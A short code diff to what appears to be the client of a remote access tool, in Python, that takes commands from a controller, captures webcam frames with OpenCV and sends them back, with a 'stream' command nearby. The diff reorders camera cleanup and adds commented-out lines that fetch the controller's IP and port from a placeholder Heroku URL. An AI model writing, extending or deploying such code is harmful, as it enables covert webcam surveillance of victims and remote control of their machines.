@@ -170,11 +170,12 @@ class Client:
 								cam = cv2.VideoCapture(position)
 								check, frame = cam.read()
 								assert check
-								cam.release()
-								cv2.destroyAllWindows()
 								self.send_message({'message': f'Upload of webcam screenshot complete!', 'webcam': frame})
 							except:
 								self.send_message({'message': f'Upload of webcam screenshot failed.'})
+							else:
+								cam.release()
+								cv2.destroyAllWindows()
 
 						elif message[:6].lower() == 'stream':
 							try:
@@ -324,6 +325,8 @@ class Client:
 
 if __name__ == '__main__':
 	try:
+		# data = requests.get('https://YOUR_HEROKU_URL.herokuapp.com/').json()
+		# client = Client(data['ip'], data['port'], data['encoding'])
 		client = Client()
 		client.connect()
 		client.listen()
